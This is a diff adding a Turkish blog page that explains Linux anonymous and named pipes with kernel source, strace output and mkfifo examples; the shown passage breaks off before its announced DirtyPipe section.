@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="tr">
+    <head>
+        <meta charset="utf-8">
+        <title>    Linux/Unix sistemlerde Borular ve DirtyPipe
+</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="HandheldFriendly" content="True" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	
+
+	<meta name="author" content="0x656e" />
+	<meta name="description" content="Linux/Unix sistemlerde Borular ve DirtyPipe Öncelikle yazıya boruların orjinal isminin “PIPE” olduğuyla giriş yapmak istiyorum. Çalışma yapısı itibariyle boru gibi olduğu için borular şeklinde bahsedeceğim ama siz yine de PIPE diye bilin. Biliyorsunuz ki Türkçe teknik kitaplarda İngilizce teknik terimlerin direkt çevirisi dolayısıyla bolca sıkıntı yaşıyoruz. Girizgah Bir önceki …" />
+	<meta name="keywords" content="linux pipes, linux borular, pipe nedir, linux pipes türkçe, işletim sistemi borular, işletim sistemlerinde borular, işletim sistemlerinde pipelar, pipe ne demek, dirtypipe, anonymous pipe, isimsiz pipe, isimli pipe, isimsiz borular, isimli borular, named pipes">
+			<meta property="article:tag" content="linux pipes" />
+			<meta property="article:tag" content="linux borular" />
+			<meta property="article:tag" content="pipe nedir" />
+			<meta property="article:tag" content="linux pipes türkçe" />
+			<meta property="article:tag" content="işletim sistemi borular" />
+			<meta property="article:tag" content="işletim sistemlerinde borular" />
+			<meta property="article:tag" content="işletim sistemlerinde pipelar" />
+			<meta property="article:tag" content="pipe ne demek" />
+			<meta property="article:tag" content="dirtypipe" />
+			<meta property="article:tag" content="anonymous pipe" />
+			<meta property="article:tag" content="isimsiz pipe" />
+			<meta property="article:tag" content="isimli pipe" />
+			<meta property="article:tag" content="isimsiz borular" />
+			<meta property="article:tag" content="isimli borular" />
+			<meta property="article:tag" content="named pipes" />
+	<link rel="canonical" href="https://enesergun.net/linuxunix-sistemlerde-borular-ve-dirtypipe.html"/>
+
+	
+	<meta name="description" content=""/>
+	
+        
+        <!-- og definitions -->
+	<meta property="og:type" content="article" />
+	<meta property="og:url" content="https://enesergun.net/linuxunix-sistemlerde-borular-ve-dirtypipe.html" />
+	<meta property="og:title" content="Linux/Unix sistemlerde Borular ve DirtyPipe" />
+	<meta property="og:description" content="Linux/Unix sistemlerde Borular ve DirtyPipe Öncelikle yazıya boruların orjinal isminin “PIPE” olduğuyla giriş yapmak istiyorum. Çalışma yapısı itibariyle boru gibi olduğu için borular şeklinde..." />
+	<meta property="og:image" content="https://w0.peakpx.com/wallpaper/212/918/HD-wallpaper-virtual-world-sunset-80s-landscape-retro-theme-tron.jpg" />
+        <link rel="stylesheet" href="theme/style.css">
+        <link href="https://enesergun.net/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Enes Ergün Atom Feed" />
+        
+    </head>
+    <body>
+       
+
+            <div class="container">
+
+<header class="blog-header">
+    <h1><a href="https://enesergun.net" class="glitch glow" data-text="Enes Ergün">Enes Ergün</a></h1>
+
+    <p> Chaotic Neutral / ISTP-T - 30 lvl rogue - Cyber Security </p>
+    <nav>
+        <a href="https://enesergun.net/">INDEX</a>
+        <a href="https://enesergun.net/archives">ARCHIVES</a>
+        <a href="https://enesergun.net/categories">CATEGORIES</a>
+    </nav>
+</header>
+
+    <div class="post">
+
+        <header>
+            <h1>Linux/Unix sistemlerde Borular ve DirtyPipe</h1>
+            <p class="date">Written on <time datetime="2023-10-11T22:00:00+03:00">Oct 11, 2023</time></p>
+            
+        </header>
+
+        <article>
+            <h1>Linux/Unix sistemlerde Borular ve DirtyPipe</h1>
+<blockquote>
+<p>Öncelikle yazıya boruların orjinal isminin “<strong>PIPE</strong>” olduğuyla giriş yapmak istiyorum. Çalışma yapısı itibariyle boru gibi olduğu için borular şeklinde bahsedeceğim ama siz yine de PIPE diye bilin. Biliyorsunuz ki Türkçe teknik kitaplarda İngilizce teknik terimlerin direkt çevirisi dolayısıyla bolca sıkıntı yaşıyoruz.</p>
+</blockquote>
+<h2>Girizgah</h2>
+<p>Bir önceki post olan <a href="[https://enesergun.net/windows-sistemlerde-borularpipe.html](https://enesergun.net/windows-sistemlerde-borularpipe.html)">Windows Sistemlerde Borular (PIPE)</a> yazısında işletim sistemleri arası iletişim serisi şeklinde blog konularından gideceğimi yazmıştım. Bakmayın ben de öğrenip, araştırıp yazıyorum. Bildiğime değil yani. Her neyse bu blog yazısındaki konumuz da bir önceki ile benzer olarak Linux sistemlerde Borular şeklinde olacak.</p>
+<h2>Neymiş bu borular?</h2>
+<p>Linux’a ucundan köşesinden dokunmuş herkes en azından aşağıdaki komutu yazmıştır.</p>
+<div class="highlight"><pre><span></span><code><span class="n">cat</span><span class="w"> </span><span class="n">foo</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s">&quot;bar&quot;</span><span class="w"></span>
+</code></pre></div>
+
+<p>İlgili komut <strong>cat</strong> komutuna verilen ilk argüman olan dosyayı okuyup daha sonra <strong>PIPE’layarak</strong> dan sonraki process’e iletiyor. İkinci kısımdaki uygulama olan <strong>grep</strong> de bu outputu alarak işliyor ve çıktısını ekrana veriyor. Tabi bütün bu işlemler memory üzerinde gerçekleşiyor. Burada FIFO (First-in First-out) olarak çalıştığını belirtmekte yarar var. Fakat FIFO için aşağıda ayrı bir başlık açacağız inş. Borulara çalışma seviyesi açısından bakarsak da <strong>user land &gt; kernel land &gt; user land</strong> şeklinde bir akış çizebiliriz. User land ile kernel land adres alanları kullanılıyor. Burası <strong>çokomelli</strong>. </p>
+<p>Yukarıdaki örnek sh komutu için: “Abi grep ile cat’i aynı anda niye kullanıyorsun fazladan process çalıştırıyorsun diyenlerin ağzına kürekle vururum.” Neyse, kısaca özetlersek:</p>
+<p>cat ile standart input(<strong>stdin</strong>)’tan okunan veri standart output(<strong>stdout</strong>) ile pipelanarak grep komutunun standart input’una veriyi gönderiyor. Bir de tabi bunun standart error (stderr) kısmı var.</p>
+<p>Linux üzerindeki <strong>File Descriptorlara</strong> kısaca göz atarsak, şimdilik bu kadarı yeterli olacaktır diye düşünüyorum:</p>
+<ul>
+<li>stdin = fd 0</li>
+<li>stdout = fd 1</li>
+<li>stderr = fd 2</li>
+</ul>
+<p>Tıpkı Windowsda olduğu gibi Linux sistemlerde de borular ikiye ayrılıyor. Bu ayrım yine aynı şekilde:</p>
+<ul>
+<li>Anonymous Pipes</li>
+<li>Named Pipes</li>
+</ul>
+<p>Diğer sistemlerden farklı olarak Linux sistemlerde önemli bir fark bulunuyor. Bu fark linux üzerinde boruların bufferlanarak kullanılmasından kaynaklanmaktadır. Buffer boyutu olarak da Wikipedia’da yazana göre 64KiB olarak belirtilmekte fakat aslında sistem bazında page size’a göre belirleniyor. Linux 2.6.11’den beri 16 page size’a eşit olarak geldiği belirtiliyor. Pek tabii farklı 3rd party filtre kullanarak bu boru boyutu artırılabiliyor. Bufferlama özelliği için aşağıdaki halk ağzıyla olan girdi basitleştirmek için kullanılabilir sanırım:</p>
+<blockquote>
+<p>İlk process’in çıktısı buffer’ı doldurarak ikinci process’i besler eğer buffer boşalmamışsa yani ikinci process veriyi alıp bufferı silmediyse ilk process durur(blocking) ve bekler.
+</p>
+</blockquote>
+<p>Boruların Byte Stream olarak kullanılıyor olduğunu biliyoruz fakat man sayfasına baktığımızda aslında <strong>Linux 3.4’den</strong> beri <strong>O_DIRECT</strong> flagi ile birlikte packet modunda da pipe oluşturabildiğimizi görebiliriz. Burası önemli bir nokta. Diğer değinmemiz gereken flag ise <strong>O_NONBLOCK</strong> flagidir. İlgili flag ile de borunun blocking moduna karar verebiliyoruz.</p>
+<h2>Şimdi Daha Derine</h2>
+<p>Yukarıda Linux üzerinde 2 tür boru olduğundan bahsetmiştik. Genel anlamda biz boruları kullanırken <strong><em>*</em></strong><strong><em>“|”</em></strong><strong><em>*</em></strong> işaretini kullansak da İsimli borular için FIFOs terimi kullanılıyor. </p>
+<h3>İsimsiz borular</h3>
+<p>Aslında yazının bu kısmına kadar genel anlamda “Anonymous Pipes” dan bahsettik ama ayırmamız gerekiyor. </p>
+<p>Linux üzerindeki implementasyona baktığımızda “pipe()” (<strong>Not: pipe() ve pipe2() ile birlikte</strong>) sistem çağrısıyla boru oluşturabiliyoruz. İlgili sistem çağrısı ise do_pipe fonksiyonunu çalıştırıyor ve geri dönüş olarak bize 2 adet file descriptor dönüyor. </p>
+<p><a href="https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1010">https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c</a></p>
+<div class="highlight"><pre><span></span><code><span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">pipe2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">do_pipe2</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">fildes</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">do_pipe2</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">do_pipe2</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">files</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">error</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__do_pipe_flags</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">files</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">fd</span><span class="p">))))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="n">fput</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"></span>
+<span class="w">            </span><span class="n">fput</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+<span class="w">            </span><span class="n">put_unused_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"></span>
+<span class="w">            </span><span class="n">put_unused_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+<span class="w">            </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="n">fd_install</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"></span>
+<span class="w">            </span><span class="n">fd_install</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">error</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Default olarak boruların max boyutu için: </p>
+<div class="highlight"><pre><span></span><code><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">pipe</span><span class="o">-</span><span class="n">max</span><span class="o">-</span><span class="n">size</span><span class="w"></span>
+<span class="n">$</span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1048576</span><span class="w"></span>
+</code></pre></div>
+
+<p>Bir pipe oluşturduğumuzda yapılan çağrıları takip etmek için strace kullanalım ve bazı sistem çağrılarını takip edelim. Bunlar: execve, pipe, write ve read çağrıları.</p>
+<p>Komut:</p>
+<div class="highlight"><pre><span></span><code><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">qf</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">execve</span><span class="p">,</span><span class="n">pipe</span><span class="p">,</span><span class="n">write</span><span class="p">,</span><span class="n">read</span><span class="w"> </span>\
+<span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">wc</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="err">&#39;</span><span class="w"></span>
+</code></pre></div>
+
+<p>Output:</p>
+<div class="highlight"><pre><span></span><code><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cat temp.txt | wc -c&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xffffd2c6a6d8</span><span class="w"> </span><span class="cm">/* 55 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;temp.txt&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xaaaad55eaef8</span><span class="w"> </span><span class="cm">/* 55 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/wc&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;wc&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xaaaad55eaf28</span><span class="w"> </span><span class="cm">/* 55 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="o">**</span><span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="o">**</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w">  </span><span class="o">&lt;</span><span class="n">unfinished</span><span class="w"> </span><span class="p">...</span><span class="o">&gt;</span><span class="w"></span>
+<span class="o">**</span><span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unfinished</span><span class="w"> </span><span class="p">...</span><span class="o">&gt;**</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="p">...</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">resumed</span><span class="o">&gt;</span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="p">...</span><span class="w"> </span><span class="n">write</span><span class="w"> </span><span class="n">resumed</span><span class="o">&gt;</span><span class="p">)</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517066</span><span class="p">]</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="n">SIGCHLD</span><span class="w"> </span><span class="p">{</span><span class="n">si_signo</span><span class="o">=</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="w"> </span><span class="n">si_code</span><span class="o">=</span><span class="n">CLD_EXITED</span><span class="p">,</span><span class="w"> </span><span class="n">si_pid</span><span class="o">=</span><span class="mi">517067</span><span class="p">,</span><span class="w"> </span><span class="n">si_uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="n">si_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_utime</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_stime</span><span class="o">=</span><span class="mi">0</span><span class="p">}</span><span class="w"> </span><span class="o">---</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;# Locale name alias data base.</span><span class="se">\n</span><span class="s">#&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2996</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">)</span><span class="w">          </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="o">**</span><span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">16384</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="o">**</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">16384</span><span class="p">)</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;25</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">325</span><span class="w"></span>
+<span class="p">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
+<span class="o">---</span><span class="w"> </span><span class="n">SIGCHLD</span><span class="w"> </span><span class="p">{</span><span class="n">si_signo</span><span class="o">=</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="w"> </span><span class="n">si_code</span><span class="o">=</span><span class="n">CLD_EXITED</span><span class="p">,</span><span class="w"> </span><span class="n">si_pid</span><span class="o">=</span><span class="mi">517068</span><span class="p">,</span><span class="w"> </span><span class="n">si_uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="n">si_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_utime</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_stime</span><span class="o">=</span><span class="mi">0</span><span class="p">}</span><span class="w"> </span><span class="o">---</span><span class="w"></span>
+<span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
+</code></pre></div>
+
+<p>İlgili çıktıda dikkat ederseniz PID numarası +1 olarak iki ayrı process olarak geliyor. Bunun sebebi biz ilgili komutu gerçekleştirdiğimizde aslında uygulamalar üzerinde boruların doğası gereği bir değişim yapmıyoruz. İlgili programlar normal bir süreçmiş gibi stdin ve stdout’larını alıyorlar. Burada magic olan kısım direkt olarak borular oluyor. 2 process’in normal şartlarda birbirinden haberi yok. Fakat; eğer biraz <a href="http://pwn.college">pwn.college</a> çözmüşseniz orada görmüş olacağınız gibi processlerin çalışma mantığından dolayı bizi değer ileten programı child-parent process( çünkü fork 🙂 ) ilişkisi içerisinde görebilir ve kontrol edebilirsiniz.  </p>
+<h2>İsimli Borular / Named Pipes</h2>
+<p>Linux üzerinde isimli boruların, isimsiz borulardan çok da bir farkı yok aslında ama… Bu zat-ı muhteremlerin en büyük farkı kendilerinin aslında bir persistency (kalıcılık) sunması. İsimsiz borularda her şey iki process arasında memory ile paylaşılırken burada bir virtual file system üzerinden okunup, yazılıyor. Doğal olarak siz bir isimli boru oluşturduğunuzda diğer sessionlarınız ile de ilgili boru üzerinde işlem yapabiliyorsunuz. Bu da bize büyük bir esneklik sağlıyor. </p>
+<p>Her neyse… Linux üzerinde isimli boru oluşturmak için 2 adet komutumuz bulunuyor. Bunlar:</p>
+<ol>
+<li>mknod</li>
+<li>mkfifo</li>
+</ol>
+<p>Örnek olarak ebucehil adında bir pipe oluşturdum. Ben artık istediğim process veya session ile buraya yazabilir ve buradan okuyabilirim.</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
+<span class="err">└─#</span><span class="w"> </span><span class="n">mkfifo</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
+
+<span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
+<span class="err">└─#</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"> </span>
+<span class="n">prw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="mi">20</span><span class="o">:</span><span class="mi">18</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
+</code></pre></div>
+
+<p>Yazma veya okuma işlemi için linux üzerindeki çıktı yönlendirmeyi kullanabilirsiniz. <strong>Not: Kullanıcılara dikkat edin.</strong> </p>
+<p>Yazma:</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ka1</span><span class="p">]</span><span class="w"></span>
+<span class="err">└─#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
+</code></pre></div>
+
+<p>Okuma:</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">ka1</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
